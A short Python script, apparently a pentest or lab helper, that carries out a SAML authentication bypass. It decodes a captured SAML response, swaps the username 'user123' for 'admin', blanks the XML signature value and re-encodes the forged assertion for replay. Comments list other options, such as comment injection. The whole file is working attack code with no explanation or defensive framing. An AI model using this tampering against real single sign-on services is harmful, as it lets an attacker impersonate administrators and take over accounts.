#SAML choices
#Response Tampering
#Signature stripping w/ tampering
#Comment injection 

import base64
import re
import urllib.parse

encoded_txt = ""
url_decoded_txt = urllib.parse.unquote(encoded_txt)
decoded_txt = base64.b64decode(url_decoded_txt, validate=True).decode('utf-8') # decode saml response

res = decoded_txt.replace("user123", "admin") #SAML response tampering

signature_value_pattern = re.compile(r'<ds:SignatureValue>(.*?)</ds:SignatureValue>', re.DOTALL) # signature 
res = re.sub(signature_value_pattern, '<ds:SignatureValue></ds:SignatureValue>', res)            # signature

reencoded_txt = base64.b64encode(res.encode('utf-8')).decode('utf-8') # re-encoding the tampered payload
url_encoded_txt = urllib.parse.quote(reencoded_txt)
print(url_encoded_txt)


